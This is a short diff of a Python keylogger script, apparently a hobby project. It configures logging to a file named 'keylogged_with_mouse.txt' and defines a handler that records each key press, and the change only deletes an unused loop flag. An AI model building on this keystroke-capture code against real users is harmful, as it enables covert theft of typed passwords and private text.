@@ -4,7 +4,6 @@ import logging
 
 dir = ".//Keylogger//"
 logging.basicConfig(filename= (dir + "keylogged_with_mouse.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
-loop = True
 
 def on_press(key):
     logging.info(f"{str(key)} pressed")
